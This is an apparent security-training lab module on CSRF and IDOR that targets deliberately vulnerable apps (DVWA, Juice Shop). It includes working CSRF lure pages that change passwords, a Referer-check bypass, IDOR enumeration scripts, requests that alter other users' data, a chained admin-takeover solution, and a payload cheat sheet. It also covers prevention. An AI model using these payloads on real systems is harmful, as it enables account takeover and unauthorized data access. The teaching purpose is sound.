# Intermediate Module 2: CSRF and IDOR

**Difficulty:** ⭐⭐ Intermediate  
**Time Required:** 2-3 hours  
**Prerequisites:** Completed Authentication Attacks module

---

## Learning Objectives

By the end of this module, you will be able to:

- Understand and exploit CSRF vulnerabilities
- Identify and exploit IDOR vulnerabilities
- Bypass common CSRF protections
- Understand the impact of access control failures
- Implement proper protections

---

## Part 1: Cross-Site Request Forgery (CSRF)

### What is CSRF?

CSRF tricks authenticated users into performing unintended actions. The attacker creates a malicious page that makes requests to a vulnerable site using the victim's session.

### Attack Flow

```
1. Victim logs into bank.com (gets session cookie)
2. Victim visits attacker's evil.com
3. evil.com contains hidden form to bank.com/transfer
4. Victim's browser sends request WITH session cookie
5. Bank processes transfer as if victim initiated it
```

---

## Exercise 2.1: Basic CSRF Attack

### Setup

1. Navigate to DVWA → CSRF
2. Set security to **Low**

### Analyze the Form

```bash
# See how the password change works
curl -s "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/csrf/" \
  -H "Cookie: security=low; PHPSESSID=YOUR_SESSION" | grep -A 20 "form"
```

The form sends:
- `password_new` - New password
- `password_conf` - Confirm password
- `Change` - Submit button

### Create Malicious Page

```html
<!-- csrf_attack.html -->
<!DOCTYPE html>
<html>
<head>
    <title>You Won a Prize!</title>
</head>
<body>
    <h1>🎉 Congratulations! You won!</h1>
    <p>Click below to claim your $1000 prize!</p>
    
    <!-- Hidden image triggers the CSRF -->
    <img src="http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" 
         style="display:none" 
         width="0" height="0">
    
    <button onclick="alert('Prize claimed!')">Claim Prize</button>
</body>
</html>
```

### Host the Attack Page

```bash
# In Kali pod
cat > /tmp/csrf.html << 'EOF'
<!DOCTYPE html>
<html>
<body>
<h1>Free Gift!</h1>
<img src="http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change" style="display:none">
</body>
</html>
EOF

# Host it
cd /tmp && python3 -m http.server 9999
```

### Execute the Attack

1. Ensure victim is logged into DVWA
2. Victim visits: `http://KALI_IP:9999/csrf.html`
3. Password is changed without victim's knowledge!

<details>
<summary>✅ Why This Works</summary>

- The browser automatically includes the PHPSESSID cookie
- The server sees a valid session and processes the request
- No validation that the request originated from DVWA

</details>

---

## Exercise 2.2: CSRF with POST Requests

### Auto-Submitting Form

```html
<!DOCTYPE html>
<html>
<body onload="document.getElementById('csrf').submit();">
    <h1>Loading...</h1>
    
    <form id="csrf" 
          action="http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/csrf/" 
          method="GET">
        <input type="hidden" name="password_new" value="hacked123">
        <input type="hidden" name="password_conf" value="hacked123">
        <input type="hidden" name="Change" value="Change">
    </form>
</body>
</html>
```

### Using JavaScript

```html
<!DOCTYPE html>
<html>
<body>
<script>
// Create and submit form automatically
var form = document.createElement('form');
form.method = 'GET';
form.action = 'http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/csrf/';

var fields = {
    'password_new': 'hacked',
    'password_conf': 'hacked',
    'Change': 'Change'
};

for (var key in fields) {
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = key;
    input.value = fields[key];
    form.appendChild(input);
}

document.body.appendChild(form);
form.submit();
</script>
</body>
</html>
```

---

## Exercise 2.3: Bypassing CSRF Protections

### DVWA Medium Security

Set DVWA to **Medium** and try the same attack.

**What Changed?**

```php
// Medium security checks Referer header
if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )
```

### Bypass Techniques

**1. Referer Header Manipulation**

The check only verifies the server name is IN the referer, not that it starts with it:

```
Valid: http://dvwa-service.vulnerable-apps.svc.cluster.local/page
Also Valid: http://evil.com/dvwa-service.vulnerable-apps.svc.cluster.local/attack
```

Create a directory with the target hostname:

```bash
mkdir -p "/tmp/www/dvwa-service.vulnerable-apps.svc.cluster.local"
cp /tmp/csrf.html "/tmp/www/dvwa-service.vulnerable-apps.svc.cluster.local/index.html"
cd /tmp/www && python3 -m http.server 9999
```

**2. Missing Referer**

Some browsers/configurations don't send Referer. Test with meta tag:

```html
<meta name="referrer" content="no-referrer">
```

**3. Data URI / JavaScript**

```html
<a href="data:text/html,<form action='http://target/csrf' method='GET'><input name='password_new' value='hacked'></form><script>document.forms[0].submit()</script>">Click me</a>
```

---

## Part 2: Insecure Direct Object Reference (IDOR)

### What is IDOR?

IDOR occurs when an application exposes internal object references (like database IDs) and doesn't verify the user has permission to access them.

### Example

```
GET /api/users/1    → Your profile (allowed)
GET /api/users/2    → Someone else's profile (should be denied, but isn't!)
```

---

## Exercise 2.4: IDOR in Juice Shop

### Finding IDOR Vulnerabilities

```bash
# Login and get token
TOKEN=$(curl -s -X POST "http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test123"}' | jq -r '.authentication.token')

# Access your own basket (ID 1)
curl -s "http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000/rest/basket/1" \
  -H "Authorization: Bearer $TOKEN" | jq .

# Try accessing other baskets (IDOR!)
curl -s "http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000/rest/basket/2" \
  -H "Authorization: Bearer $TOKEN" | jq .

curl -s "http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000/rest/basket/3" \
  -H "Authorization: Bearer $TOKEN" | jq .
```

### User Enumeration

```bash
# Enumerate users
for i in {1..20}; do
  echo "=== User $i ==="
  curl -s "http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000/api/Users/$i" \
    -H "Authorization: Bearer $TOKEN" | jq -r '.data.email // "Not found"'
done
```

### Finding Admin Panel

```bash
# The admin panel exists but is "hidden"
curl -s "http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000/rest/admin/application-configuration" \
  -H "Authorization: Bearer $TOKEN" | jq .
```

<details>
<summary>✅ What You Should Find</summary>

- Other users' baskets with their items
- User emails and data
- Admin configuration (if token has admin role)
- Order history of other users

</details>

---

## Exercise 2.5: Automated IDOR Testing

### Python IDOR Scanner

```python
#!/usr/bin/env python3
"""
IDOR Scanner for Juice Shop
"""
import requests
import sys

BASE_URL = "http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000"
TOKEN = "YOUR_JWT_TOKEN"

ENDPOINTS = [
    "/rest/basket/{}",
    "/api/Users/{}",
    "/api/Cards/{}",
    "/api/Addresss/{}",
    "/rest/order-history/{}",
]

headers = {"Authorization": f"Bearer {TOKEN}"}

print("[*] IDOR Scanner Starting...")
print(f"[*] Target: {BASE_URL}")
print()

for endpoint in ENDPOINTS:
    print(f"\n[*] Testing: {endpoint}")
    print("-" * 50)
    
    for id in range(1, 11):
        url = BASE_URL + endpoint.format(id)
        try:
            r = requests.get(url, headers=headers, timeout=5)
            
            if r.status_code == 200:
                data = r.json()
                if data.get('data') or data.get('status') == 'success':
                    print(f"  [+] ID {id}: ACCESSIBLE")
                    # Print first 100 chars of response
                    print(f"      {str(data)[:100]}...")
            elif r.status_code == 401:
                print(f"  [-] ID {id}: Unauthorized")
            elif r.status_code == 404:
                print(f"  [-] ID {id}: Not found")
            else:
                print(f"  [?] ID {id}: Status {r.status_code}")
                
        except Exception as e:
            print(f"  [!] ID {id}: Error - {e}")

print("\n[*] Scan complete!")
```

### Run the Scanner

```bash
# Get your token first
TOKEN=$(curl -s -X POST "http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test123"}' | jq -r '.authentication.token')

echo "Token: $TOKEN"

# Update and run the script
python3 /tmp/idor_scan.py
```

---

## Exercise 2.6: IDOR Impact Demonstration

### Modify Another User's Basket

```bash
# Add item to another user's basket
curl -X POST "http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000/api/BasketItems/" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ProductId": 1, "BasketId": 2, "quantity": 100}'
```

### Change Another User's Address

```bash
# If you can access /api/Addresss/
curl -X PUT "http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000/api/Addresss/2" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"street": "Hacked Street", "city": "Hacked City"}'
```

---

## Knowledge Check

1. What's the difference between CSRF and XSS?
2. Why doesn't the Same-Origin Policy prevent CSRF?
3. What makes an object reference "insecure"?
4. How can CSRF tokens prevent attacks?
5. What's the principle behind proper access control?

<details>
<summary>✅ Answers</summary>

1. XSS executes attacker's scripts in user's browser; CSRF tricks user's browser into making requests
2. SOP prevents reading responses, not sending requests. CSRF doesn't need to read the response
3. When the application doesn't verify the user has permission to access the referenced object
4. Tokens are unique per session and verified server-side; attacker can't know the token
5. Verify authorization for every request, not just authentication

</details>

---

## Prevention

### CSRF Prevention

**1. CSRF Tokens**

```php
// Generate token
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// Include in form
<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">

// Verify on submit
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF validation failed');
}
```

**2. SameSite Cookies**

```
Set-Cookie: session=abc123; SameSite=Strict
```

**3. Verify Origin Header**

```php
$allowed_origins = ['https://mysite.com'];
if (!in_array($_SERVER['HTTP_ORIGIN'], $allowed_origins)) {
    die('Invalid origin');
}
```

### IDOR Prevention

**1. Use Indirect References**

```python
# Instead of: /api/users/123
# Use: /api/users/me
# Or: /api/users/abc-random-uuid
```

**2. Verify Authorization**

```python
def get_basket(basket_id, user):
    basket = Basket.get(basket_id)
    if basket.owner_id != user.id:
        raise Forbidden("Access denied")
    return basket
```

**3. Access Control Lists**

```python
@require_permission('view_basket')
def view_basket(request, basket_id):
    # Only users with permission can access
    pass
```

---

## Challenge Lab

### Scenario

A web application has both CSRF and IDOR vulnerabilities. Your mission:

1. Create a CSRF attack that changes a user's email
2. Find IDOR vulnerabilities in the API
3. Chain the vulnerabilities for maximum impact
4. Propose fixes for each vulnerability

<details>
<summary>✅ Challenge Solution</summary>

**1. CSRF Attack:**

```html
<html>
<body onload="document.forms[0].submit()">
<form action="http://target/api/user/update" method="POST">
  <input name="email" value="attacker@evil.com">
  <input name="csrf_token" value="">
</form>
</body>
</html>
```

**2. IDOR Discovery:**

```bash
for i in {1..100}; do
  curl -s "http://target/api/orders/$i" -H "Auth: token"
done
```

**3. Chained Attack:**

1. Use IDOR to find admin user ID
2. Use CSRF to change admin's email to attacker's
3. Use password reset to gain admin access

**4. Fixes:**

- CSRF: Implement tokens, SameSite cookies
- IDOR: Check ownership before access, use UUIDs

</details>

---

## Summary

In this module, you learned:

- ✅ How CSRF attacks work
- ✅ Creating CSRF exploits
- ✅ Bypassing CSRF protections
- ✅ Finding and exploiting IDOR
- ✅ Prevention techniques

### Next Steps

Continue to: **Intermediate Module 3: API Security**

---

## Quick Reference

### CSRF Payloads

```html
<!-- GET request via image -->
<img src="http://target/action?param=value">

<!-- POST via form -->
<form action="http://target/action" method="POST">
  <input name="param" value="value">
</form>
<script>document.forms[0].submit()</script>

<!-- Ajax (limited by CORS) -->
<script>
fetch('http://target/action', {method: 'POST', body: 'param=value'})
</script>
```

### IDOR Testing

```bash
# Sequential IDs
for i in {1..100}; do curl "http://target/api/item/$i"; done

# With auth
curl -H "Authorization: Bearer TOKEN" "http://target/api/user/2"

# POST to different user
curl -X POST -d '{"user_id": 2}' "http://target/api/action"
```
